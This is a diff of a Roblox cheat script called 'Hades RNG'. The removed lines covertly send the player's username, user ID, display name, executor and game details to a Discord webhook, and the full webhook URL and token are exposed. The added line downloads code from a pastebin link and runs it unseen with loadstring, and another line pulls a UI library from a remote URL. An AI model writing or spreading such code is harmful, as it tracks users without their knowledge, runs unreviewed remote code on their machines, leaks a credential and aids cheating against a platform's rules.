@@ -6,33 +6,7 @@ lp:Kick("you are blacklisted because you join discord for the script and left!")
 break
 end
 end
-local hs=game:GetService("HttpService")
-local wh="https://discord.com/api/webhooks/1363978720410468515/pzO3alicvMtGr5Of8f1d5gMgbGAeqNLLurXQ_yN8Oir1wgXFAPPLUGXpf5berHh4tphp"
-local ex="Unknown"
-if syn then
-ex="Synapse X"
-elseif secure_load then
-ex="Sentinel"
-elseif pebc_execute then
-ex="KRNL"
-elseif identifyexecutor then
-ex=identifyexecutor()
-elseif hookfunction and checkcaller and setreadonly then
-ex="Delta"
-end
-local ms=game:GetService("MarketplaceService")
-local pn="Unknown"
-pcall(function()
-pn=ms:GetProductInfo(game.PlaceId).Name
-end)
-local d={
-content=string.format("Hades RNG\nRoblox Username: %s\nDisplay Name: %s\nUser ID: %s\nExecutor: %s\nPlace ID: %s\nPlace Name: %s",lp.Name,lp.DisplayName,lp.UserId,ex,game.PlaceId,pn)
-}
-local j=hs:JSONEncode(d)
-local r=(syn and syn.request)or request or(http and http.request)
-if r then
-r({Url=wh,Method="POST",Headers={["Content-Type"]="application/json"},Body=j})
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/sGxBvPDM"))()
 local lib=loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
 local win=lib:MakeWindow({Name="Hades RNG",HidePremium=true,IntroEnabled=true,IntroText="Hades RNG",IntroIcon="rbxassetid://7734068321"})
 local t=win:MakeTab({Name="Main",Icon="rbxassetid://7733747233",PremiumOnly=false})
